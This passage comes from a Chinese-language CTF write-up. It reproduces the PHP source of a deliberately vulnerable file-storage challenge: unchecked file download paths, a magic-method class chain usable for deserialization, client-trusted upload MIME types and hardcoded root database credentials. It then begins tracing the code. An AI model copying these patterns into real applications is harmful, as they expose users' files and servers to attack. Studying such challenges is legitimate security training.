class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>])) &#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$pos</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/gif&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/jpeg&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/png&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Only gif/jpg/png allowed&quot;</span>);<br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>            <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$dst</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>] . <span class="hljs-variable">$filename</span> . <span class="hljs-variable">$fileext</span>;<br>        <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$dst</span>);<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Invaild filename&quot;</span>);<br>        <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Name</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Size</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;dropbox&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();<br>        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$expect</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Name</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Size</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//download.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;flag&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<span class="hljs-comment">//注意这里我们无法让文件名中包含flag</span><br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//delate.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>    <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">detele</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;File not exist&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>网盘管理界面是<code>index.php</code>，我们从该文件开始看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Name</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Size</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>new</code>了一个<code>FileList</code>类，我们跟踪到该类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 